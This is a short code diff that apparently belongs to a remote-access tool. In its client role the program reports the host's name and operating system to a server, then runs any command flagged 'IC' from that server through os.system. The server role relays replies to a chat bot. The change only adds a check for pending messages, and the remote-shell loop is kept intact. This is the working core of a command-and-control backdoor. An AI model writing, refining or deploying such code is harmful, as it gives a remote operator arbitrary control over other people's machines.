@@ -8,8 +8,9 @@ if ROLE == "Server":
     from Server.main import bot
     twm = SeTWM()
     while True:
-        receive, flag = twm.receive()
-        bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}") if flag == "IR" else None
+        if twm.check_for_messages():
+            receive, flag = twm.receive()
+            bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}") if flag == "IR" else None
         time.sleep(3.5)
         
          
@@ -17,6 +18,7 @@ else:
     twm = SuTWM()
     twm.send(twm.compileCommand("IND", {"name": socket.gethostname(), "os": platform.platform()}), "0.0.0", "IND", "Hi Server! Can you give me an address?")
     while True:
-        receive, flag = twm.receive()
-        os.system(str(receive)) if flag == "IC" else None
+        if twm.check_for_messages():
+            receive, flag = twm.receive()
+            os.system(str(receive)) if flag == "IC" else None
         time.sleep(3.5)
